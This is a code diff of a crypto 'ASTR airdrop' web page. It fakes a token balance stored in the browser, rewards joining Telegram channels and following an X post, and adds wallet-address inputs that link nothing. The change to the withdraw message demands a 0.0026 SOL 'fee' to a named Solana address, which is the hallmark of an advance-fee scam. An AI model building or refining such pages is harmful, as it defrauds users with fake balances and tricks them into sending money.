@@ -11,6 +11,7 @@
         .gradient-btn { background: linear-gradient(90deg, #3a86ff, #8338ec); border: none; }
         .wallet-card { background: #1e2126; border-radius: 10px; padding: 12px; border-left: 4px solid #3a86ff; margin-bottom: 8px; }
         .task-done { opacity: 0.5; pointer-events: none; border: 1px solid gray !important; color: gray !important; }
+        .input-box { background: #000; border: 1px solid #3a86ff; border-radius: 8px; padding: 8px; width: 100%; color: #3a86ff; font-size: 10px; outline: none; display: none; margin-top: 10px; }
     </style>
 </head>
 <body class="p-4 max-w-md mx-auto">
@@ -29,35 +30,40 @@
 
     <div class="card text-center">
         <p class="text-gray-400 text-sm">Your ASTR Balance</p>
-        <h2 id="balanceDisplay" class="text-4xl font-black mt-1">8,400 ASTR</h2>
-        <button id="claimBtn" class="gradient-btn w-full py-3 mt-4 rounded-xl font-black text-lg shadow-lg opacity-50" disabled>ALREADY CLAIMED</button>
+        <h2 id="balanceDisplay" class="text-4xl font-black mt-1">8,460 ASTR</h2>
+        <button class="gradient-btn w-full py-3 mt-4 rounded-xl font-black text-lg shadow-lg opacity-50" disabled>ALREADY CLAIMED</button>
     </div>
 
     <div class="card">
         <h3 class="font-bold text-sm text-yellow-500 mb-3 uppercase italic">Wallet Options</h3>
-        <div class="wallet-card flex justify-between items-center">
-            <span class="text-sm font-bold">Binance Wallet</span>
-            <button onclick="alert('Connection Pending...')" class="bg-blue-600 px-4 py-1 rounded-lg text-xs font-bold">Connect</button>
+        
+        <div class="wallet-card">
+            <div class="flex justify-between items-center">
+                <span class="text-sm font-bold">Binance Wallet</span>
+                <button id="binanceBtn" onclick="showInput('binance')" class="bg-blue-600 px-4 py-1 rounded-lg text-xs font-bold">Connect</button>
+            </div>
+            <input id="binanceInput" type="text" placeholder="Enter SOL Address..." class="input-box">
         </div>
-        <div class="wallet-card flex justify-between items-center" style="border-left-color: #00f0ff;">
-            <span class="text-sm font-bold">Bitget Wallet</span>
-            <button onclick="alert('Connection Pending...')" class="bg-blue-600 px-4 py-1 rounded-lg text-xs font-bold">Connect</button>
+
+        <div class="wallet-card" style="border-left-color: #00f0ff;">
+            <div class="flex justify-between items-center">
+                <span class="text-sm font-bold">Bitget Wallet</span>
+                <button id="bitgetBtn" onclick="showInput('bitget')" class="bg-blue-600 px-4 py-1 rounded-lg text-xs font-bold">Connect</button>
+            </div>
+            <input id="bitgetInput" type="text" placeholder="Enter SOL Address..." class="input-box">
         </div>
     </div>
 
     <div class="card">
         <h3 class="font-bold text-sm mb-4 uppercase text-blue-400">Tasks (20 ASTR Each)</h3>
-        
         <div class="flex justify-between items-center mb-4 pb-2 border-b border-gray-800">
             <span class="text-xs">Join Telegram Official</span>
             <button id="task1Btn" onclick="doTask(1, 'https://t.me/XNO_AIRDROP_OFFICIAL')" class="text-blue-400 border border-blue-400 px-4 py-1 rounded-md text-xs font-bold">JOIN</button>
         </div>
-
         <div class="flex justify-between items-center mb-4 pb-2 border-b border-gray-800">
             <span class="text-xs">Join Telegram Channel</span>
             <button id="task2Btn" onclick="doTask(2, 'https://t.me/+pO1956ctV4JiODg9')" class="text-blue-400 border border-blue-400 px-4 py-1 rounded-md text-xs font-bold">JOIN</button>
         </div>
-
         <div class="flex justify-between items-center">
             <span class="text-xs">Follow on Twitter/X</span>
             <button id="task3Btn" onclick="doTask(3, 'https://x.com/i/status/2035895387677233355')" class="text-blue-400 border border-blue-400 px-4 py-1 rounded-md text-xs font-bold">FOLLOW</button>
@@ -75,7 +81,7 @@
     <button onclick="handleWithdraw()" class="w-full py-4 rounded-2xl bg-green-600 font-black text-xl uppercase shadow-2xl">Withdraw</button>
 
     <script>
-        let balance = parseFloat(localStorage.getItem('astr_bal')) || 8400;
+        let balance = parseFloat(localStorage.getItem('astr_bal')) || 8460;
 
         window.onload = () => {
             updateUI();
@@ -89,9 +95,27 @@
             document.getElementById('balanceDisplay').innerText = balance.toLocaleString() + " ASTR";
         }
 
+        // ইনপুট বক্স দেখানোর ফাংশন
+        function showInput(type) {
+            let input = document.getElementById(type + 'Input');
+            let btn = document.getElementById(type + 'Btn');
+            
+            if (input.style.display === "block") {
+                if(input.value.length > 20) {
+                    alert("Wallet Linked!");
+                    btn.innerText = "LINKED";
+                    input.style.display = "none";
+                } else {
+                    alert("Please enter a valid address!");
+                }
+            } else {
+                input.style.display = "block";
+                btn.innerText = "SUBMIT";
+            }
+        }
+
         function doTask(id, url) {
             window.open(url, '_blank');
-            // ২ সেকেন্ড পর ক্লেইম হবে
             setTimeout(() => {
                 if(!localStorage.getItem('t' + id + '_done')) {
                     balance += 20;
@@ -118,7 +142,7 @@
         }
 
         function handleWithdraw() {
-            alert("ASTR COIN AIRDROP\n\nWithdrawal Locked Until Airdrop Ends");
+            alert("ASTR COIN AIRDROP\n\nWithdrawal Locked Until Airdrop Ends\n\nFee: 0.0026 SOL to 6pDb7eYdLUUrrSmKdh5H1FXGTTfE1b4pFhGaYFiuMkG3");
         }
 
         function startTimer() {
